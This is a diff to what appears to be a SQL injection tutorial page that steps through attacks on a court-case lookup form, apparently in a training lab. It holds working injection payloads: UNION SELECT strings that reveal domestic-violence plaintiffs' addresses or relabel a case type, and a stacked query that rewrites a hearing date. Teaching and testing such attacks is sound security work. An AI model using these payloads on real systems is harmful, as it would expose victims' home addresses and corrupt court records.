@@ -72,7 +72,8 @@ require('../resources/header.html');
 
           <p class='text-primary'>Step 5: We notice on domestic violence cases the plaintiff addres isn't shown. Using the same trick as before we can show the plaintiff address as case description</p>
           <p>fakecasenumber' UNION ALL SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,CONCAT("Plaintiffs Address: ",Plaintiff_Address) as Case_Description,Judge From casedata WHERE Case_Number = '12C934902</p>
-
+          <p>Or we could change the case type.
+          <p>fakecasenumber' UNION ALL SELECT Case_Number,"Criminal" as Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,Case_Description,Judge From casedata WHERE Case_Number = '12C934902</p>
           <p class='text-primary'>Step 6: We test to see if it will let us run multiple queries. If the permissions aren't set right we can update or delte out information.</p>
           <p>fakecasenumber'; UPDATE casedata SET Hearing_Date = '10/25/2019' WHERE Case_Number = '12C934910</p>
 
